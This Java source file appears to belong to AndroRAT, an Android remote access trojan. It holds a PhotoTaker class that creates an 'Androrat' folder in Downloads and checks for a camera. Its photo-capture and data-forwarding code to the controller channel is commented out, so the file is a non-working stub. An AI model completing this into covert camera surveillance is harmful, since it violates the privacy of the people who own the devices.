package my.app.Library;

import java.io.File;
import java.io.IOException;

import my.app.client.ClientListener;
import my.app.client.R;
import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;

import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.sax.StartElementListener;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceHolder.Callback;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.webkit.WebView.FindListener;
import android.widget.ImageView;
import android.widget.Toast;

import static android.app.Activity.RESULT_OK;

public class PhotoTaker {
	private static final int RESULT_PICTURE_TAKEN=1337;
	private File rootDir;

	ClientListener ctx;
	int chan;
	SurfaceHolder holder;

	public PhotoTaker(ClientListener c, int chan) {
		this.chan = chan;
		ctx = c;
		File downloads= Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
		rootDir=new File(downloads, "Androrat");
		rootDir.mkdirs();
	}

	public boolean takePhoto() throws InterruptedException {
		if (!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)))
			return false;
		Log.i("CAMERA1", "la fotocamera presente");
//		Intent i=new CameraActivity.IntentBuilder(ctx)
//				.to(new File(rootDir, "test.jpg"))
//				.updateMediaStore()
//				.build();
//
//		getstartActivityForResult(i, RESULT_PICTURE_TAKEN);


		return true;
	}


//	@Override
//	protected void onActivityResult(int requestCode, int resultCode,
//									Intent data) {
//		Toast t=null;
//		byte bytedata[] = new byte[0];
//		ctx.handleData(chan, bytedata);
//
//		if (resultCode==RESULT_OK) {
//			if (requestCode==RESULT_PICTURE_TAKEN) {
//				t=Toast.makeText(ctx, "Picture taken",
//						Toast.LENGTH_LONG);
//			}
//
//			t.show();
//		}
//	}



}
